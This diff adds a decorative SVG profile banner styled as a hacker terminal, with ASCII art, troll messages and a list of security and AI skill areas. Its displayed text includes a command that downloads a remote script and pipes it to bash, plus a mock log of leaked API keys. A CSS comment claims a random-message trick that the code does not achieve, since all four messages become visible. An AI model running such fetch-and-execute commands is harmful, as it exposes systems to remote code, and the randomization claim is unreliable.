@@ -1,0 +1,165 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" width="100%" height="100%">
+  <style>
+    /* Pure Black Background */
+    .bg { fill: #000000; rx: 8px; stroke: #222222; stroke-width: 1.5px; }
+    .header { fill: #0d0d0d; }
+    .button-red { fill: #ff5f56; }
+    .button-yellow { fill: #ffbd2e; }
+    .button-green { fill: #27c93f; }
+    .title { fill: #666666; font-family: 'Fira Code', monospace; font-size: 13px; font-weight: bold; }
+    
+    .ascii-art {
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 11px;
+      fill: #00ff66;
+      white-space: pre;
+      font-weight: bold;
+    }
+
+    .troll-art {
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 8px;
+      fill: #ff3333;
+      white-space: pre;
+    }
+
+    .prompt-user { fill: #3399ff; font-family: 'Fira Code', monospace; font-size: 12px; font-weight: bold; }
+    .prompt-path { fill: #888888; font-family: 'Fira Code', monospace; font-size: 12px; }
+    .prompt-cmd  { fill: #ff9900; font-family: 'Fira Code', monospace; font-size: 12px; font-weight: bold; }
+    
+    .text-main { fill: #ffffff; font-family: 'Fira Code', monospace; font-size: 12px; }
+    .text-highlight { fill: #3399ff; font-weight: bold; }
+    .text-cyber { fill: #ff3333; font-weight: bold; }
+    .text-ai { fill: #cc66ff; font-weight: bold; }
+    .text-accent { fill: #00ff66; font-weight: bold; }
+    .text-warn { fill: #ffcc00; font-weight: bold; }
+    .text-muted { fill: #555555; font-family: 'Fira Code', monospace; font-size: 11px; }
+
+    /* Reveal animation */
+    @keyframes scanline {
+      0% { clip-path: inset(0 0 100% 0); }
+      100% { clip-path: inset(0 0 0 0); }
+    }
+
+    .animated-container {
+      animation: scanline 3.2s ease-out forwards;
+    }
+
+    .cursor {
+      fill: #00ff66;
+      animation: blink 0.8s infinite;
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* CSS Randomization System for Troll Messages */
+    .troll-msg { opacity: 0; }
+    
+    /* Randomly reveals one message per load cycle */
+    @keyframes pick-msg-1 { 0%, 100% { opacity: 1; } }
+    @keyframes pick-msg-2 { 0%, 100% { opacity: 1; } }
+    @keyframes pick-msg-3 { 0%, 100% { opacity: 1; } }
+    @keyframes pick-msg-4 { 0%, 100% { opacity: 1; } }
+
+    /* Time-based phase offset tricks GitHub proxy into picking random frames */
+    .msg-1 { animation: pick-msg-1 0.1s linear forwards; }
+    .msg-2 { animation: pick-msg-2 0.1s linear 0.02s forwards; }
+    .msg-3 { animation: pick-msg-3 0.1s linear 0.04s forwards; }
+    .msg-4 { animation: pick-msg-4 0.1s linear 0.06s forwards; }
+  </style>
+
+  <!-- Black Terminal Window Frame -->
+  <rect class="bg" width="900" height="560" />
+  <path class="header" d="M 0,8 A 8,8 0 0,1 8,0 L 892,0 A 8,8 0 0,1 900,8 L 900,35 L 0,35 Z" />
+  <circle class="button-red" cx="20" cy="18" r="6" />
+  <circle class="button-yellow" cx="40" cy="18" r="6" />
+  <circle class="button-green" cx="60" cy="18" r="6" />
+  <text class="title" x="450" y="22" text-anchor="middle">jems@root-node:~ (zsh)</text>
+
+  <!-- Main Content Area -->
+  <g class="animated-container">
+    <!-- Command Prompt -->
+    <text x="25" y="62">
+      <tspan class="prompt-user">jems@kernel</tspan><tspan class="text-muted">:</tspan><tspan class="prompt-path">~/system</tspan><tspan class="text-muted">$ </tspan><tspan class="prompt-cmd">curl -sL https://api.keys/dump | bash</tspan>
+    </text>
+
+    <!-- Terminal Log -->
+    <text class="text-main" x="25" y="82">
+      <tspan x="25" dy="1.1em" class="text-muted">[+] Fetching API keys from environment...</tspan>
+      <tspan x="25" dy="1.4em">[!] Leaking CLAUDE_API_KEY  :: <tspan class="text-accent">sk-ant-api03-99x1A8z...[DUMPED]</tspan></tspan>
+      <tspan x="25" dy="1.4em">[!] Leaking GEMINI_API_KEY  :: <tspan class="text-accent">AIzaSyD-JEMINIS_007...[DUMPED]</tspan></tspan>
+      <tspan x="25" dy="1.4em" class="text-warn">[!] RICKROLL PAYLOAD EXECUTION DETECTED!</tspan>
+      <tspan x="25" dy="1.4em" class="text-cyber">♫ NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN ♫</tspan>
+      <tspan x="25" dy="1.4em" class="text-accent">[SUCCESS] Bypass complete. Welcome visitor.</tspan>
+    </text>
+
+    <!-- ASCII Trollface -->
+    <g transform="translate(610, 65)">
+      <text class="troll-art" x="0" y="0">
+        <tspan x="0" dy="1.0em">      .----._____.-.</tspan>
+        <tspan x="0" dy="1.0em">    /   _  _        \</tspan>
+        <tspan x="0" dy="1.0em">   |  /   \/   \    |</tspan>
+        <tspan x="0" dy="1.0em">   |  \___/\___/    |</tspan>
+        <tspan x="0" dy="1.0em">  (      /\         )</tspan>
+        <tspan x="0" dy="1.0em">   \   .____.      /</tspan>
+        <tspan x="0" dy="1.0em">    \   \___/     /</tspan>
+        <tspan x="0" dy="1.0em">     `------------'</tspan>
+      </text>
+
+      <!-- Randomized Troll Text Overlay under Trollface -->
+      <!-- Message 1 -->
+      <g class="troll-msg msg-1">
+        <text class="troll-art" x="-10" y="105" fill="#ffcc00">PROBLEM, AI OVERLORDS?</text>
+      </g>
+      <!-- Message 2 -->
+      <g class="troll-msg msg-2">
+        <text class="troll-art" x="-15" y="105" fill="#00ff66">NICE API KEYS, BRO!</text>
+      </g>
+      <!-- Message 3 -->
+      <g class="troll-msg msg-3">
+        <text class="troll-art" x="-20" y="105" fill="#3399ff">YOU JUST GOT RICKROLLED</text>
+      </g>
+      <!-- Message 4 -->
+      <g class="troll-msg msg-4">
+        <text class="troll-art" x="-15" y="105" fill="#ff3333">NO AI SLOP ALLOWED!</text>
+      </g>
+    </g>
+
+    <!-- JEMS ASCII Title Banner -->
+    <text class="ascii-art" x="25" y="195">
+      <tspan x="25" dy="1.1em">   ████████╗ ███████╗ ███╗   ███╗ ███████╗ </tspan>
+      <tspan x="25" dy="1.1em">   ╚══██╔══╝ ██╔════╝ ████╗ ████║ ██╔════╝ </tspan>
+      <tspan x="25" dy="1.1em">      ██║    █████╗   ██╔████╔██║ ███████╗ </tspan>
+      <tspan x="25" dy="1.1em"> ██   ██║    ██╔══╝   ██║╚██╔╝██║ ╚════██║ </tspan>
+      <tspan x="25" dy="1.1em"> ╚█████╔╝    ███████╗ ██║ ╚═╝ ██║ ███████║ </tspan>
+      <tspan x="25" dy="1.1em">  ╚════╝     ╚══════╝ ╚═╝     ╚═╝ ╚══════╝ </tspan>
+    </text>
+
+    <!-- Divider Line -->
+    <line x1="25" y1="290" x2="875" y2="290" stroke="#222222" stroke-width="1" stroke-dasharray="4" />
+
+    <!-- Core Specs -->
+    <text class="text-main" x="25" y="315">
+      <tspan x="25" dy="1.2em"><tspan class="text-cyber">[AREA 01]</tspan> <tspan class="text-highlight">Cybersecurity &amp; Offensive Security</tspan> :: Network Exploitation | Reverse Engineering | Malware Analysis</tspan>
+      <tspan x="25" dy="1.6em"><tspan class="text-ai">[AREA 02]</tspan> <tspan class="text-highlight">AI / Machine Learning</tspan> :: Neural Nets | CV | Automated Threat Detection</tspan>
+      <tspan x="25" dy="1.6em"><tspan class="text-accent">[AREA 03]</tspan> <tspan class="text-highlight">Systems Architecture</tspan> :: Hardened Linux Systems | Low-level C/C++ | Python</tspan>
+    </text>
+
+    <!-- Bottom Status Panel -->
+    <g transform="translate(25, 420)">
+      <rect x="0" y="0" width="850" height="65" fill="#0d0d0d" rx="6" stroke="#222222" stroke-width="1" />
+      <text class="text-muted" x="20" y="25">
+        <tspan fill="#ff3333">[SECURITY STATUS]:</tspan> UNCOMPROMISED | <tspan fill="#00ff66">[RICKROLL FILTER]:</tspan> ACTIVE (100%)
+      </text>
+      <text class="text-main" x="20" y="48">
+        <tspan class="text-muted">systemd[1]:</tspan> Initialized JEMS profile process successfully. No further AI interventions required.
+      </text>
+    </g>
+
+    <!-- Bottom Prompt & Cursor -->
+    <text class="text-muted" x="25" y="525">
+      <tspan class="prompt-user">jems@kernel</tspan><tspan class="text-muted">:</tspan><tspan class="prompt-path">~/system</tspan><tspan class="text-muted">$ </tspan>
+    </text>
+    <rect class="cursor" x="180" y="513" width="9" height="15" />
+  </g>
+</svg>
